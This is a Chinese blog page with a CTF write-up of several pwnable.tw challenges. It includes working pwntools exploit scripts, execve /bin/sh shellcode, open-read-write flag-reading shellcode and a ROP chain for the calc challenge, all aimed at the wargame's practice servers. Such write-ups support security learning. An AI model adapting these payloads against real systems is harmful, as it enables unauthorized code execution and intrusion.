<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/shuwen.jpg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/shuwen.jpg">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="做有意思的事，有意思地做事">
<meta property="og:type" content="website">
<meta property="og:title" content="Shuwen&#39;s blog">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="Shuwen&#39;s blog">
<meta property="og:description" content="做有意思的事，有意思地做事">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Shuwen">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://yoursite.com/page/5/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Shuwen's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Shuwen's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">生活 & 学习</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/09/16-07-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/01/09/16-07-undefined/" class="post-title-link" itemprop="url">pwnable.tw记录(前八题)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-09 16:07:39" itemprop="dateCreated datePublished" datetime="2021-01-09T16:07:39+08:00">2021-01-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 16:58:29" itemprop="dateModified" datetime="2021-04-20T16:58:29+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pwnable-tw记录（前八题）"><a href="#pwnable-tw记录（前八题）" class="headerlink" title="pwnable.tw记录（前八题）"></a>pwnable.tw记录（前八题）</h1><blockquote>
<p>更新中.jpg</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210115105118752.png" alt="image-20210115105118752"></p>
</blockquote>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><blockquote>
<p>栈溢出，ret2shellocde</p>
<p>程序流程：执行一次write函数和一次read函数。</p>
<ul>
<li>第一次栈溢出，劫持程序返回write函数的赋参地址（接下来write会将之前的esp地址输出）</li>
<li>第二次write输出esp地址，read函数布置栈空间，放上shellcode，并通过esp的偏移找到shellcode的地址，放在返回地址上。</li>
</ul>
</blockquote>
<p><img src="/2021/01/09/16-07-undefined/20200423213641742.png" alt="20200423213641742"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210104164903387.png" alt="image-20210104164903387"></p>
<p>因为第一次最后面retn的时候pop eip，所以第二次write的时候，esp会在0xffffd10c也就是旧的esp的地方。</p>
<p>第二次read的时候，因为add esp,14h，所以这里的覆盖量还是0x14</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./start'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b*0x08048060")</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.send(payload)<span class="comment">#不是sendline，否则0x0a会覆盖esp地址的低地址</span></span><br><span class="line"></span><br><span class="line">esp = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">shellcode_addr = esp + <span class="number">0x14</span><span class="comment">#后来的返回地址和之前的esp就差一个0x14，因为最后一个（add esp,14h）</span></span><br><span class="line">log.success(<span class="string">"shellcode_addr:"</span>+hex(shellcode_addr))</span><br><span class="line">shellcode = <span class="string">'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'</span><span class="comment">#32位较短的shellcode</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"b"</span>*<span class="number">0x14</span>+p32(shellcode_addr) + shellcode</span><br><span class="line">log.success(<span class="string">"len:"</span>+hex(len(payload)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/105717621" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/105717621</a></p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><blockquote>
<p>开启了沙箱，只能执行open、read和write函数</p>
<p>程序流程：输入shellcode，执行shellcode，但shellcode里面只能orw</p>
<p>找orw的shellcode即可。</p>
<p><a href="https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/6645?spm=5176.12901015.0.i12901015.5e28525cINEQJh#toc-3</a></p>
</blockquote>
<p>shellcode的编写思路</p>
<ol>
<li><p>打开flag文件（open）</p>
</li>
<li><p>将文件内内容读到（read）指定位置的栈上（其实哪里东西，，，注意不会被覆盖就行）</p>
</li>
<li><p>用write函数读取指定位置的信息即可。</p>
</li>
</ol>
<h3 id="32位函数寄存器"><a href="#32位函数寄存器" class="headerlink" title="32位函数寄存器"></a>32位函数寄存器</h3><ul>
<li>第一个参数：ebx</li>
<li>第二个参数：ecx</li>
<li>第三个参数：edx</li>
</ul>
<h3 id="int-0x80调用表"><a href="#int-0x80调用表" class="headerlink" title="int 0x80调用表"></a>int 0x80调用表</h3><blockquote>
<p>几个常用的，不常用的见<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">百度</a></p>
</blockquote>
<table>
<thead>
<tr>
<th><strong>%eax</strong></th>
<th><strong>Name</strong></th>
<th><strong>Source</strong></th>
<th><strong>%ebx</strong></th>
<th><strong>%ecx</strong></th>
<th><strong>%edx</strong></th>
<th><strong>%esx</strong></th>
<th><strong>%edi</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>sys_exit</td>
<td>kernel/exit.c</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>2</td>
<td>sys_fork</td>
<td>arch/i386/kernel/process.c</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#pt_regs" target="_blank" rel="noopener">struct pt_regs</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>3</td>
<td>sys_read</td>
<td>fs/read_write.c</td>
<td>unsigned int</td>
<td>char *</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>4</td>
<td>sys_write</td>
<td>fs/read_write.c</td>
<td>unsigned int</td>
<td>const char *</td>
<td><a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html#size_t" target="_blank" rel="noopener">size_t</a></td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>5</td>
<td>sys_open</td>
<td>fs/open.c</td>
<td>const char *</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td>6</td>
<td>sys_close</td>
<td>fs/open.c</td>
<td>unsigned int</td>
<td>-</td>
<td>-</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><p>函数原型：<code>int open(const char * pathname, int flags, mode_t mode);</code></p>
<p>flags表示读写权限，0表示只读</p>
<ul>
<li><code>O_RDONLY</code>：以只读方式打开文件。</li>
<li><code>O_WRONLY</code>：以只写方式打开文件。</li>
<li><code>O_RDWR</code>：以可读写方式打开文件。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int fd = open(<span class="string">"/home/orw/flag"</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#将字符串"/home/orw/flag"放入栈中</span></span><br><span class="line">push <span class="number">0x00006761</span></span><br><span class="line">push <span class="number">0x6c662f77</span></span><br><span class="line">push <span class="number">0x726f2f65</span></span><br><span class="line">push <span class="number">0x6d6f682f</span></span><br><span class="line"></span><br><span class="line">/bin/sh</span><br><span class="line"><span class="number">0x0068732f</span></span><br><span class="line"><span class="number">0x00006873</span></span><br><span class="line"><span class="number">0x6E69622f</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov eax,0x5#open函数调用号</span><br><span class="line">mov ebx,esp#第一个参数为字符串地址，因为字符串在刚刚压栈，就是esp</span><br><span class="line">xor ecx,ecx#第二个参数为0</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<p><img src="/2021/01/09/16-07-undefined/image-20210104213908883.png" alt="image-20210104213908883"></p>
<h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>函数原型：<code>ssize_t read(int fd, void *buf, size_t count);</code></p>
<p>fd是文件描述符</p>
<ul>
<li><p>标准输入（standard input）的文件描述符是 0</p>
</li>
<li><p>标准输出（standard output）的文件描述符是 1</p>
</li>
</ul>
<p>所以这里将open函数的返回值作为文件描述符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(fd,buf,<span class="number">0x30</span>);//直接用之前的</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax#fp的地址，也就是open函数返回地址</span><br><span class="line">mov ecx,esp#读入到栈上，因为后续没有push、pop等操作，所以esp不变</span><br><span class="line">mov edx,0x30#长度</span><br><span class="line">mov eax,0x3#read函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>



<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>函数原型：<code>ssize_t write(int fd, const void *buf, size_t nbyte);</code></p>
<p>标准输出，故文件描述符为1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x30</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,0x1#文件描述符为1</span><br><span class="line">mov eax,0x4#write函数调用号</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./orw'</span></span><br><span class="line"><span class="comment">#p = process(filename)</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Give my your shellcode:"</span>)</span><br><span class="line">payload = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">push 0x00006761</span></span><br><span class="line"><span class="string">push 0x6c662f77</span></span><br><span class="line"><span class="string">push 0x726f2f65</span></span><br><span class="line"><span class="string">push 0x6d6f682f</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x30</span></span><br><span class="line"><span class="string">mov eax,0x3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,0x1</span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2018-1160"><a href="#CVE-2018-1160" class="headerlink" title="CVE-2018-1160"></a>CVE-2018-1160</h2><p><a href="https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/3710?spm=5176.12901015.0.i12901015.1d27525cNPKLYj#toc-0</a></p>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172</a></p>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><blockquote>
<p>实现了一个计算器的功能，由于逻辑不严密，导致可以构造非法式子，修改内存的值。</p>
<p>需要耐心分析程序，<del>maybe还需要脑洞大开</del></p>
</blockquote>
<p><img src="/2021/01/09/16-07-undefined/image-20210108173852141.png" alt="image-20210108173852141"></p>
<p>主函数很简单，主要看calc函数</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210108174030310.png" alt="image-20210108174030310"></p>
<p>主要有三个函数，get_expr用来输入计算公式并过滤非法字符；init_pool在站上分配一段空间并将内容清0；parse_expr是主要函数，用于对计算公式解析并计算。最后由printf函数打印输出结果。</p>
<p>注意：函数结束的条件是<code>!get_expr((int)&amp;expr_0, 1024)</code>输入的字符串长度大于1024，然后可以返回main继续执行。</p>
<h3 id="bzero函数"><a href="#bzero函数" class="headerlink" title="bzero函数"></a>bzero函数</h3><p>原型：extern void bzero（void *s, int n）;</p>
<ul>
<li>s 要置零的数据的起始地址</li>
<li>n 要置零的数据字节个数</li>
</ul>
<p><img src="/2021/01/09/16-07-undefined/image-20210108174912889.png" alt="image-20210108174912889"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210108175150201.png" alt="image-20210108175150201"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210110211310303.png" alt="image-20210110211310303"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210110211900726.png" alt="image-20210110211900726"></p>
<p>这里需要好好理解。</p>
<p>漏洞在于，</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210110212502340.png" alt="image-20210110212502340"></p>
<p><img src="/2021/01/09/16-07-undefined/image-20210110213412358.png" alt="image-20210110213412358"></p>
<p>最后在栈内布置如下rop</p>
<table>
<thead>
<tr>
<th>值</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>0x0805c34b</td>
<td>pop eax ; ret</td>
</tr>
<tr>
<td>11</td>
<td>数值</td>
</tr>
<tr>
<td>0x080701aa</td>
<td>pop edx ; ret</td>
</tr>
<tr>
<td>0</td>
<td>数值</td>
</tr>
<tr>
<td>0x080701d1</td>
<td>pop ecx ; pop ebx ; ret</td>
</tr>
<tr>
<td>0</td>
<td>数值</td>
</tr>
<tr>
<td>binsh地址</td>
<td>通过main ebp计算得到</td>
</tr>
<tr>
<td>0x08049a21</td>
<td>int 0x80</td>
</tr>
<tr>
<td>0x6E69622f</td>
<td>“/bin”</td>
</tr>
<tr>
<td>0x0068732f</td>
<td>“/sh\x00”</td>
</tr>
</tbody></table>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./calc'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10100)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p.recvuntil(<span class="string">"==="</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ebp_base = p.recv()</span><br><span class="line">ebp_base = int(ebp_base)</span><br><span class="line">print(<span class="string">"[*]ebp_base1:"</span>+str(ebp_base))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*]ebp_base2:"</span>+hex( int(ebp_base) &amp; <span class="number">0xffffffff</span> ))</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"+361+77490"</span></span><br><span class="line">payload2 = <span class="string">"+362-77479"</span></span><br><span class="line">payload3 = <span class="string">"+363+134599427"</span></span><br><span class="line">payload4 = <span class="string">"+364-134599427"</span></span><br><span class="line">payload5 = <span class="string">"+365+77518"</span></span><br><span class="line">payload6 = <span class="string">"+366-77518"</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line">p.sendline(payload5)</span><br><span class="line">p.sendline(payload6)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=ebp_base + <span class="number">4</span></span><br><span class="line">diff_367=bin_sh_addr - <span class="number">77518</span></span><br><span class="line">p.sendline(<span class="string">'+367'</span>+str(diff_367))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'+368'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_368 = p.recvline()</span><br><span class="line">diff_368 =  <span class="number">134519329</span> - int(num_368)</span><br><span class="line">print(<span class="string">"[*]diff_368:"</span>+str(diff_368))</span><br><span class="line">print(<span class="string">"[*]num_368:"</span>+str(num_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+368"</span>)</span><br><span class="line">p.sendline(<span class="string">"+368+"</span>+str(diff_368))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+369"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">num_369 = p.recvline()</span><br><span class="line">diff_369 = <span class="number">1852400175</span> - int(num_369)</span><br><span class="line">p.sendline(<span class="string">"+369+"</span>+str(diff_369))</span><br><span class="line">print(<span class="string">"[*]num_369:"</span>+str(num_369))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"+370"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">num_370 = p.recvline()</span><br><span class="line">print(<span class="string">"[*]num_370:"</span>+str(num_370))</span><br><span class="line">diff_370 = int(num_370) - <span class="number">6845231</span></span><br><span class="line">p.sendline(<span class="string">"+370-"</span>+str(diff_370))</span><br><span class="line">print(<span class="string">"[*]diff_370:"</span>+str(diff_370))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">2048</span>)</span><br><span class="line">p.sendline(<span class="string">"+361"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<p><a href="https://www.freebuf.com/articles/system/189636.html" target="_blank" rel="noopener">从pwnable.tw-calc看数组越界造成的任意地址读写</a></p>
<p>youtube上视频：<a href="https://www.youtube.com/watch?v=LTgNNE04x2w" target="_blank" rel="noopener">https://www.youtube.com/watch?v=LTgNNE04x2w</a></p>
<h2 id="3-17"><a href="#3-17" class="headerlink" title="3* 17"></a>3* 17</h2><h2 id="dubblesort"><a href="#dubblesort" class="headerlink" title="dubblesort"></a>dubblesort</h2><blockquote>
<p>保护全开、栈溢出</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>输入name    =&gt;    字符串没有’\x00’截断，信息泄露，计算libc基址</li>
<li>输入sort的数字个数    =&gt;     个数任意</li>
<li>输入数字到arr_sort数组    =&gt;        数组在[esp+1Ch]的位置【注意：这里gdb调试的时候用ebp不好使，，，】</li>
<li>sort进行排序    =&gt;     数据从小到大输入才不会被改变</li>
</ol>
<blockquote>
<p>故如果个数较大，使得输入的数据能够覆盖返回地址和参数，即可getshell</p>
</blockquote>
<h4 id="1-name-libc基址"><a href="#1-name-libc基址" class="headerlink" title="1.name(libc基址)"></a>1.name(libc基址)</h4><p>令<code>name=“aaaa”</code>，查看内存，故令name为“a”×0x18，最后还要发送回车或其他覆盖泄漏地址的低字节。</p>
<p><img src="/2021/01/09/16-07-undefined/image-20210113094525538.png" alt="image-20210113094525538"></p>
<p><strong>这里基址的获取不等于<code>0xf7f55000 - 0xf7da2000 = 0x1B3000</code>，因为本地libc库和目标系统的libc库不一样，偏移也就不同！</strong></p>
<h5 id="libc基址偏移的获取"><a href="#libc基址偏移的获取" class="headerlink" title="libc基址偏移的获取"></a>libc基址偏移的获取</h5><p>使用命令<code>readelf -S libc_32.so.6</code>查找<code>.got.plt</code>段的起始地址即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;tw$ readelf -S libc_32.so.6 </span><br><span class="line">There are 68 section headers, starting at offset 0x1b0cc8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [...]</span><br><span class="line">  [31] .got.plt          PROGBITS        001b0000 1af000 000030 04  WA  0   0  4</span><br></pre></td></tr></table></figure>

<p>也就是起始地址为<code>0x001b0000</code></p>
<h5 id="system和”-bin-sh-x00”偏移"><a href="#system和”-bin-sh-x00”偏移" class="headerlink" title="system和”/bin/sh\x00”偏移"></a>system和”/bin/sh\x00”偏移</h5><p>system地址的获取指令：<code>readelf -s libc_32.so.6 | grep system</code>【注意：s是小写】</p>
